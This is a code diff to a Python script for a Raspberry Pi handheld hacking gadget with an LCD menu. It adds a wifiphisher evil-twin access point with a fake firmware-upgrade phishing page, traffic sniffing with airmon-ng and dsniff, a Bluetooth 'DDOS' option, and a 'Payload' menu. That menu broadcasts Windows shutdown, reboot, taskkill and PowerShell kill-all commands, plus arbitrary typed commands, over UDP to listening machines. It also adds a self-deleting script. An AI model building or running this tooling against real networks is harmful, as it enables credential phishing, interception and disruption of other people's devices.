@@ -8,7 +8,8 @@ import hashlib
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives import padding
 from cryptography.hazmat.backends import default_backend
-
+import socket
+import sys
 # Pin setup
 KEY_UP_PIN = 6
 KEY_DOWN_PIN = 19
@@ -36,17 +37,17 @@ Lcd_ScanDir = LCD_1in44.SCAN_DIR_DFT
 disp.LCD_Init(Lcd_ScanDir)
 disp.LCD_Clear()
 
-
-
+# Impostazioni di rete
+BROADCAST_IP = '<broadcast>'  # IP di broadcast per inviare a tutti
+PORT = 12345  # Porta UDP su cui comunicare
 
 
 
 
 
 def list_files_in_directory(directory):
-    """List all files in the specified directory."""
-    return [f for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))]
-
+    """List all files in the specified directory without extensions."""
+    return [os.path.splitext(f)[0] for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))]
 
 def draw_file_menu(files, selected_index):
     """Draw the file menu on the display in a grid format."""
@@ -75,24 +76,23 @@ def draw_file_menu(files, selected_index):
 
     disp.LCD_ShowImage(image, 0, 0)
 
-
-def execute_file(file_path):
-    """Execute the file based on its extension."""
-    if file_path.endswith('.py'):
-        # For Python files
-        subprocess.run(['sudo', 'python3', file_path])
-    elif file_path.endswith('.sh'):
-        # For shell scripts
-        subprocess.run(['sudo', 'bash', file_path])
-    elif file_path.endswith(".moj"):
-        subprocess.run(['sudo', './', file_path])
-    else:
-        # Handle other types or notify user
-        show_message(f"Unsupported file type: {file_path}")
-
+def execute_file(directory, file_base):
+    """Execute the file based on its base name by searching its extension."""
+    file_extensions = ['.py', '.sh', '.moj']  # Definisci le estensioni supportate
+    for ext in file_extensions:
+        file_path = os.path.join(directory, file_base + ext)
+        if os.path.exists(file_path):
+            if ext == '.py':
+                subprocess.run(['sudo', 'python3', file_path])
+            elif ext == '.sh':
+                subprocess.run(['sudo', 'bash', file_path])
+            elif ext == ".moj":
+                subprocess.run(['sudo', './', file_path])
+            return
+    # Se il file non ha una delle estensioni supportate
+    show_message(f"Unsupported file: {file_base}")
 
 def show_file_menu():
-    # Supponiamo che tu abbia una directory che contiene le app o file che vuoi mostrare
     directory = "app/"  # Modifica questo percorso con il percorso corretto
     files = list_files_in_directory(directory)
     selected_index = 0
@@ -143,8 +143,7 @@ def show_file_menu():
             show_message(f"Selected: {selected_file}", 1)
             
             # Esegui l'azione sul file selezionato
-            file_path = os.path.join(directory, selected_file)
-            execute_file(file_path)  # Chiamata alla funzione per eseguire il file
+            execute_file(directory, selected_file)  # Passa solo il nome base del file
             break
 
 def generate_key_from_password(password: str) -> bytes:
@@ -222,40 +221,6 @@ def returner():
 
     else:
         setPsk()
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 # Display logo at startup
 
@@ -380,6 +345,8 @@ def get_keyboard_input():
                 mode = "special" if mode == "alpha" else "alpha"
             elif key == "CAPS":
                 caps_lock = not caps_lock
+            elif key == "ABC":
+                mode = "alpha" if mode == "special" else "special"
             else:
                 input_text += key.upper() if caps_lock else key
 
@@ -482,7 +449,7 @@ while True:
                     show_message(f"Selected: {sub_selected_option}", 1)
 
                     if sub_selected_option == "Wifi":
-                        sub_menu_options = ["Fake AP"]
+                        sub_menu_options = ["Fake AP", "Sniff"]
                         sub_selected_index = 0
 
                         while True:
@@ -500,13 +467,42 @@ while True:
                                 sub_selected_option = sub_menu_options[sub_selected_index]
                                 show_message(f"Selected: {sub_selected_option}", 1)
 
-                                if sub_selected_option == "Fake AP":
-                                    show_message("Create a name for\n the fake AP", 3)
-                                    fakeAp = get_keyboard_input()
-                                    os.system(f"sudo wifiphisher -e {fakeAp}")
-                                    show_image("fakeAp.png", lambda: GPIO.input(KEY_PRESS_PIN) == 0)  # Show image until button press
+                            if sub_selected_option == "Fake AP":
+                                show_message("Create a name for\n the fake AP", 3)
+                                fakeAp = get_keyboard_input()  # Prende il nome inserito dall'utente
+                                # Esegui wifiphisher con il nome del fake AP
+                                command = subprocess.run(
+                                    ["sudo", "wifiphisher", "-i", "wlan0", "-e", f"{fakeAp}", "-p", "firmware-upgrade"],
+                                    capture_output=True, text=True
+                                )
 
-                     # Exit sub-menu to main menu
+                                # Mostra il risultato del comando
+                                if command.returncode == 0:
+                                    show_message(f"Fake AP '{fakeAp}' created successfully", 3)
+                                else:
+                                    show_message(f"Error: {command.stderr}", 3)
+
+                                show_message("Press joystick to stop", 3)
+                                
+                                # Loop per aspettare che l'utente interrompa il processo
+                                while True:
+                                    show_message(command.stdout, 1)  # Mostra output in tempo reale (facoltativo)
+                                    if GPIO.input(KEY_UP_PIN) == 0 or GPIO.input(KEY_DOWN_PIN) == 0 or GPIO.input(KEY_PRESS_PIN) == 0:
+                                        break
+                            if sub_menu_options == "Sniff":
+                                    os.system("sudo ifconfig wlan0 down")
+                                    os.system("sudo iwconfig wlan0 mode monitor")
+                                    os.system("sudo airmon-ng start wlan0")
+                                    os.system("sudo ifconfig wlan0 up")
+                                    command = subprocess.run(
+                                    ["sudo", "dsniff", "-i", "wlan0mon"],
+                                    capture_output=True, text=True
+                                    )
+                                    while True:
+                                        show_message(command.stdout, 1)  
+                                        if GPIO.input(KEY_UP_PIN) == 0 or GPIO.input(KEY_DOWN_PIN) == 0 or GPIO.input(KEY_PRESS_PIN) == 0:
+                                            break
+                                        
 
         elif selected_option == "Party":
             # Draw and handle the Network sub-menu
@@ -572,7 +568,7 @@ while True:
 
                     break  # Exit sub-menu to main menu
         elif selected_option == "Bluetooth":
-            sub_menu_options = ["Spam"]
+            sub_menu_options = ["Spam", "DDOS"]
             sub_selected_index = 0
 
             def draw_sub_menu(sub_selected_index):
@@ -605,7 +601,7 @@ while True:
                     show_message(f"Selected: {sub_selected_option}", 1)
 
                     if sub_selected_option == "Spam":
-                        sub_menu_options = ["iOS"]
+                        sub_menu_options = ["iOS", "Exit"]
                         sub_selected_index = 0
 
                         while True:
@@ -626,13 +622,52 @@ while True:
                                 if sub_selected_option == "iOS":
                                     os.system("sudo python3 iphone.py")
                                     show_image("bkat.png", lambda: GPIO.input(KEY_PRESS_PIN) == 0)  # Show image until button press
-
+                                    break
+                                break
                     break  # Exit Bluetooth menu to main menu
+                if sub_selected_option == "DDOS":
+                        sub_menu_options = ["SEEK AND DESTROY"]
+                        sub_selected_index = 0
+
+                        while True:
+                            draw_sub_menu(sub_selected_index)
+
+                            if GPIO.input(KEY_UP_PIN) == 0:
+                                sub_selected_index = (sub_selected_index - 1) % len(sub_menu_options)
+                                draw_sub_menu(sub_selected_index)
+                                time.sleep(0.3)
+                            if GPIO.input(KEY_DOWN_PIN) == 0:
+                                sub_selected_index = (sub_selected_index + 1) % len(sub_menu_options)
+                                draw_sub_menu(sub_selected_index)
+                                time.sleep(0.3)
+                            if GPIO.input(KEY_PRESS_PIN) == 0:
+                                sub_selected_option = sub_menu_options[sub_selected_index]
+                                show_message(f"Selected: {sub_selected_option}", 1)
+
+                                if sub_selected_option == "SEEK AND DESTROY":
+                                    os.system("sudo bash bleddos.sh")
+                                    show_image("bkat2.png", lambda: GPIO.input(KEY_PRESS_PIN) == 0)  # Show image until button press
+                                    break
+                                break
+                            break  # Exit Bluetooth menu to main menu
+                                
 
 
 
         elif selected_option == "App & Plugin":
-            show_file_menu()  # Call the function to show files
+            while True:
+                if GPIO.input(KEY1_PIN) == 0:  # Se KEY1 (P21) è premuto
+                    time.sleep(0.3)  # Debounce
+                    break
+                if GPIO.input(KEY2_PIN) == 0:  # Se KEY2 (P20) è premuto
+                    time.sleep(0.3)  # Debounce
+                    break
+                if GPIO.input(KEY3_PIN) == 0:  # Se KEY3 (P16) è premuto
+                    time.sleep(0.3)  # Debounce
+                    break
+                else:
+                    show_file_menu()  # Mostra il menu dei file dopo il ciclo
+
 
 
 
@@ -641,8 +676,131 @@ while True:
 
 
         elif selected_option == "Payload":
-            # Add your logic here for Payload option
-            show_message("Opening Payload Settings...", 2)
+
+
+            def shutdownWin():
+                """Invia un messaggio di shutdown a tutti gli utenti sulla rete."""
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  # Enable broadcast
+                message = 'shutdown /s /f /t 0'
+                sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
+                show_message("Command Executed", 3)
+
+            def rebootWin():
+                """Invia un messaggio di reboot a tutti gli utenti sulla rete."""
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  # Enable broadcast
+                message = 'shutdown /r /f /t 0'
+                sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
+                show_message("Command Executed", 3)
+
+            def RickRoll():
+                """Invia un link di Rick Roll a tutti gli utenti sulla rete."""
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  # Enable broadcast
+                message = 'start https://www.youtube.com/watch?v=dQw4w9WgXcQ'
+                sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
+                show_message("Command Executed", 3)
+
+            def KillEmAll():
+                """Invia un comando PowerShell per uccidere tutti i processi tranne explorer."""
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  # Enable broadcast
+                message = 'powershell -Command "Get-Process | Where-Object { $_.Name -ne \'explorer\' } | ForEach-Object { $_.Kill() }"'
+                sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
+                show_message("Command Executed", 3)
+
+            def Crash():
+                """Invia un comando PowerShell per uccidere tutti i processi tranne explorer."""
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  # Enable broadcast
+                message = 'taskkill /F /FI "STATUS eq RUNNING"'
+                sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
+                show_message("Command Executed", 3)
+
+
+            def Terminal():
+                """Invia un comando PowerShell per uccidere tutti i processi tranne explorer."""
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  # Enable broadcast
+                show_message("Type 'Leave' for exit", 3)
+                while True:
+                    message = get_keyboard_input()
+                    if message == "Leave":
+                        break
+                    else:
+                        sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
+                        show_message("Command Executed", 1)
+
+            def self_destruct():
+                """Rimuove il file di script."""
+                try:
+                    file_path = sys.argv[0]  # Ottieni il percorso dello script corrente
+                    os.remove(file_path)
+                    show_message("DESTROYED", 3)
+                except Exception as e:
+                    show_message("--- ERROR --", 3)
+
+            sub_menu_options = ["Shutdown", "Reboot", "RickRoll", "Kill All Process", "SELF DESTRUCTION", "Cmd", "Exit"]
+            sub_selected_index = 0
+
+            def draw_sub_menu(sub_selected_index):
+                draw.rectangle((0, 0, width, height), outline=0, fill=(0, 0, 0))
+                for i, option in enumerate(sub_menu_options):
+                    y = i * 20
+                    if i == sub_selected_index:
+                        text_size = draw.textbbox((0, 0), option, font=font)
+                        text_width = text_size[2] - text_size[0]
+                        text_height = text_size[3] - text_size[1]
+                        draw.rectangle((0, y, width, y + text_height), fill=(0, 255, 0))
+                        draw.text((1, y), option, font=font, fill=(0, 0, 0))
+                    else:
+                        draw.text((1, y), option, font=font, fill=(255, 255, 255))
+                disp.LCD_ShowImage(image, 0, 0)
+
+            while True:
+                draw_sub_menu(sub_selected_index)
+
+                if GPIO.input(KEY_UP_PIN) == 0:
+                    sub_selected_index = (sub_selected_index - 1) % len(sub_menu_options)
+                    draw_sub_menu(sub_selected_index)
+                    time.sleep(0.3)
+                if GPIO.input(KEY_DOWN_PIN) == 0:
+                    sub_selected_index = (sub_selected_index + 1) % len(sub_menu_options)
+                    draw_sub_menu(sub_selected_index)
+                    time.sleep(0.3)
+                if GPIO.input(KEY_PRESS_PIN) == 0:
+                    sub_selected_option = sub_menu_options[sub_selected_index]
+                    show_message(f"Selected: {sub_selected_option}", 1)
+
+                    if sub_selected_option == "Shutdown":
+                        shutdownWin()
+
+                    if sub_selected_option == "Reboot":
+                        rebootWin()
+
+                    if sub_selected_option == "RickRoll":
+                        RickRoll()
+
+                    if sub_selected_option == "Kill All Process":
+                        KillEmAll() # Metallica Reference?!
+                    if sub_selected_option == "Exit":
+                        break
+
+                    if sub_selected_option == "Terminal":
+                        Terminal()
+                    if sub_selected_option == "SELF DESTRUCTION":
+                        show_message("Type 'y' to confirm\nSELF DESTRUCTION", 3)
+                        request = get_keyboard_input()
+                        if request == 'y':
+                            self_destruct()
+                            break
+                        else:
+                            show_message("SELF DESTRUCTION STOPPED.", 3)
+                            break
+                    
+
+
         elif selected_option == "Shutdown":
             show_message("Shutting down...", 2)
             time.sleep(1)
